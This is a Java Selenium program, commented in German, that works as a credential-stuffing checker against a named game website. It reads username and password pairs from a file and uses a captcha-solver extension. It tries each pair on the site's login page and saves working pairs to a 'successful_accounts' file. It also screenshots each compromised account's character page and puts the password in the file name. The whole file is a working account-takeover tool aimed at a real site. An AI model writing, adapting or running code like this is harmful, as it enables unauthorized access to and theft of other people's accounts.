package org.example;

import org.apache.commons.io.FileUtils;
import org.openqa.selenium.*;
import org.openqa.selenium.chrome.ChromeDriver;


import java.io.*;
import java.util.List;

public class WebScrapingExample {
    static int n =0;
    static int accountID = 1;
    public static void main(String[] args) throws InterruptedException {
        // Setze den Pfad zum Chromedriver (du musst den passenden WebDriver herunterladen)
        System.setProperty("webdriver.chrome.driver", "newDriver\\chromedriver.exe");

        //Captcha solver
        String captcha = "https://chromewebstore.google.com/detail/buster-captcha-solver-for/mpbjkejclgfgadiemmefgebjfooflfhl";
        //Normale

        String normURL= "https://seductivelc.eu";
        String normURL2= "https://seductivelc.eu/";
        String homeURL= "https://seductivelc.eu/#";
        // URL der Login-Seite
        String loginUrl = "https://seductivelc.eu/users/login";

        // URL der News-Seite nach dem Einloggen
        String newsUrl = "https://seductivelc.eu/user/characters";
        String newsUrl2 = "https://seductivelc.eu/user/characters#";

        //https://seductivelc.eu/users/register#
        String regist = "https://seductivelc.eu/users/register";
        String regist1 = "https://seductivelc.eu/users/register#";

        // Logout
        String logout = "https://seductivelc.eu/users/logout";
        // Webdriver initialisieren
        WebDriver driver = new ChromeDriver();
        driver.manage().window().maximize();
        driver.get(captcha);

        // Finde den Button durch seine Klasse
        WebElement cap = driver.findElement(By.className("UywwFc-vQzf8d"));

        // Klicke auf den Button
        cap.click();
        Thread.sleep(3000);

        //

        if(n==0){
            driver.get(normURL);
            Thread.sleep(5000);
            n++;
        }


        // Finde ein Element, auf das du Tastaturbefehle senden möchtest

        // Lese Benutzernamen und Passwörter aus einer Datei und versuche jeden Kombination
        try (BufferedReader br = new BufferedReader(new FileReader("test.txt"));
             BufferedWriter writer = new BufferedWriter(new FileWriter("successful_accounts.txt"))) {
            String line;


            while ((line = br.readLine()) != null) {
                String[] credentials = line.trim().split("\\s+", 2);

                if (credentials.length == 2) {
                    String username = credentials[0];
                    String password = credentials[1];


                    // Cookie accept button

                    driver.get(loginUrl);



                    // Finde die Benutzernamen- und Passwortfelder und sende die Informationen
                    WebElement usernameField = driver.findElement(By.name("username")); // Hier musst du den tatsächlichen Namen des Benutzernamenfeldes angeben
                    WebElement passwordField = driver.findElement(By.name("password")); // Hier musst du den tatsächlichen Namen des Passwortfeldes angeben

                    usernameField.sendKeys(username);
                    passwordField.sendKeys(password);

                    boolean condition =false;
                    //Waiting con
                    while (!condition) {
                        try {
                            // Wartezeit in Millisekunden
                            Thread.sleep(100);
                            // Suche nach dem Element
                            List<WebElement> elements = driver.findElements(By.className("close"));

                            // Überprüfe, ob das Element gefunden wurde (Liste ist nicht leer)
                            if (!elements.isEmpty()) {
                                condition = true;
                                // Führe hier weitere Aktionen durch, wenn das Element gefunden wurde
                            }else if(driver.getCurrentUrl().equals(normURL)||driver.getCurrentUrl().equals(homeURL)||driver.getCurrentUrl().equals(normURL2)){
                                condition= true;
                            }else if(driver.getCurrentUrl().equals(regist)||driver.getCurrentUrl().equals(regist1)){
                                condition= true;
                            }
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }


                    // Warte kurz, um sicherzustellen, dass die Anmeldung abgeschlossen ist
                    try {
                        Thread.sleep(5000); // Wartezeit in Millisekunden (5 Sekunden)
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    driver.get(newsUrl);
                    // Überprüfe, ob die Anmeldung erfolgreich war
                    if (driver.getCurrentUrl().equals(newsUrl)) {
                        System.out.println("Account " + accountID + " (ID " + accountID + ") funktioniert!");
                        // Hier kannst du weitere Aktionen für erfolgreiche Anmeldungen hinzufügen

                        // Speichere den erfolgreichen Account in der Textdatei
                        String accountInfo = String.format("Account %d: %s - %s", accountID, username, password);
                        writer.write(accountInfo);
                        writer.newLine();
                        //Scroll auf Char
                        WebElement element = driver.findElement(By.className("content")); // Ändere dies entsprechend

                        // Erstelle ein JavascriptExecutor-Objekt
                        JavascriptExecutor jsExecutor = (JavascriptExecutor) driver;

                        // Führe den Scrollbefehl aus, um das Element in den sichtbaren Bereich zu bewegen
                        jsExecutor.executeScript("arguments[0].scrollIntoView({block: 'center'});", element);



                        // Mach einen Screenshot mit einem inkrementierten Zähler
                        int screenshotCounter = 1;
                        String screenshotFileName = username+ "_" + password + "_" + screenshotCounter + ".png";
                        String screenshotPath = "screenshots\\" + screenshotFileName;

                        while (new File(screenshotPath).exists()) {
                            screenshotCounter++;
                            screenshotFileName =  username+ "_" + password + "_" + screenshotCounter + ".png";
                            screenshotPath = "screenshots\\" + screenshotFileName;
                        }

                        try {
                            // Hier wird der Screenshot mit einem eindeutigen Dateinamen gespeichert
                            File screenshotFile = ((TakesScreenshot) driver).getScreenshotAs(OutputType.FILE);
                            FileUtils.copyFile(screenshotFile, new File(screenshotPath));
                            System.out.println("Screenshot gespeichert unter: " + screenshotPath);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }

                    } else {
                        System.out.println("Account " + accountID + " (ID " + accountID + ") funktioniert nicht.");
                    }
                    // Gehe zur News-Seite und mache einen Screenshot



                    accountID++;
                    //ausloggen nötig
                    driver.get(logout);
                } else {
                    System.out.println("Ungültiges Format in Zeile " + accountID + ".");
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally{
            //driver.quit();
        }
    }
}
